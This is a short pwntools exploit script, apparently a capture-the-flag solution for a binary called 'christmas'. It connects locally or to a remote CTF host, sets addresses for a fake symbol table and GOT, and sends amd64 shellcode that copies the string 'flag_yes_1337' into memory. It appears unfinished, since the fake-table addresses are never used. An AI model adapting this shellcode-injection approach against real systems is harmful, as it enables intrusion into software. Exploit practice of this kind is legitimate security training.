#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./christmas"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

func_str = "flag_yes_1337"
fake_sym_table = 0x602e00
fake_str = 0x602f00
fake_got = 0x602f90
str_tab = 0x4005B0
sym_tab = 0x4002E0

code ="""
    call here
    .ascii "flag_yes_1337"
here:
    pop rsi
    mov rdi, 0x602f00
    mov rdx,13
    rep movsb [rdi],[rsi]
    
"""

shellcode=asm(code,arch="amd64")
r.send(shellcode)
r.interactive()






